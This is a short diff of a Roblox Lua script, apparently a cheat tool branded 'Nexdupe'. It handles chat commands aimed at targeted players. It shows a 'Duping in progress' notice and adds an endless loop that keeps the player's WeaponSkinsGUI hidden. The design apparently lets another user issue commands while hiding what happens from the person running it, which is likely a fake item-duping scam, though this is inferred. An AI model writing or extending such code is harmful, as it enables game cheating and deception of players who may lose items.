@@ -225,13 +225,21 @@ local function handleChat(msg, sender)
             Title = "Nexdupe";
             Text = "Duping in progress, please wait...";
             Duration = 5,
-    })
+        })
 
         local player = game:GetService("Players").LocalPlayer
         local gui = player.PlayerGui:WaitForChild("MainScreenGui")
         local weaponSkinsGUI = gui:WaitForChild("WeaponSkinsGUI")
 
         weaponSkinsGUI.Visible = false
+
+        -- Keep WeaponSkinsGUI permanently closed
+        task.spawn(function()
+            while true do
+                weaponSkinsGUI.Visible = false
+                task.wait()
+            end
+        end)
     elseif command == ".headsit" and isTargeted(targetName) then
         local myChar = LocalPlayer.Character
         local targetPlayer = Players:FindFirstChild(args[3])
